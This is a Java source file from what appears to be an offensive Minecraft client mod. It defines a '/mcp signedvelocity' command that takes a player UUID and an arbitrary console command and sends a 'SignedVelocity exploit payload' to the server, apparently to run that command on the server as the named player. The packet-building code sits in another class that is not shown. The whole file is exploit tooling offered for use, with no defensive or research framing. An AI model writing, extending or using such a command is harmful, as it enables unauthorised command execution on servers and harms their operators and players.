package dev.wrrulosdev.mcpclient.client.commands.cmd;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import dev.wrrulosdev.mcpclient.client.commands.Command;
import dev.wrrulosdev.mcpclient.client.constants.ClientConstants;
import dev.wrrulosdev.mcpclient.client.payloads.SignedVelocityPayloadPacket;
import dev.wrrulosdev.mcpclient.client.utils.messages.Msg;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;

import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;

/**
 * Command that sends a SignedVelocity exploit payload to the server.
 * Requires a valid UUID and a console command as arguments.
 */
public class SignedVelocityExploit implements Command {

    /**
     * Registers the signedvelocity command with the client command system.
     * The command requires a valid UUID and a console command string to send the payload.
     *
     * @return A LiteralArgumentBuilder that configures the signedvelocity command.
     */
    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> register() {
        return literal("signedvelocity")
            .executes(this::executeRoot)
            .then(argument("uuid", StringArgumentType.string())
                .then(argument("consoleCommand", StringArgumentType.greedyString())
                    .executes(this::executeSignedVelocity)));
    }

    /**
     * Provides usage instructions when the command is run without arguments.
     *
     * @param context The command context.
     * @return The result of the command execution (0 indicates success).
     */
    private int executeRoot(CommandContext<FabricClientCommandSource> context) {
        Msg.sendFormattedMessage(ClientConstants.PREFIX + "&cUsage: /mcp signedvelocity <uuid> <consoleCommand>");
        return 0;
    }

    /**
     * Executes the SignedVelocity exploit by validating the UUID and sending the payload.
     *
     * @param context The command context containing the UUID and command arguments.
     * @return The result of the command execution (0 indicates success).
     */
    private int executeSignedVelocity(CommandContext<FabricClientCommandSource> context) {
        String uuid = StringArgumentType.getString(context, "uuid");

        if (!uuid.matches("^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")) {
            Msg.sendFormattedMessage(ClientConstants.PREFIX + "&cInvalid UUID format. Use a valid Minecraft UUID with hyphens.");
            return 0;
        }

        String command = StringArgumentType.getString(context, "consoleCommand");
        Msg.sendFormattedMessage(ClientConstants.PREFIX + "&aSending the &fSignedVelocity &aPayload Exploit to the server...");
        SignedVelocityPayloadPacket.send(uuid, command);
        return 0;
    }
}
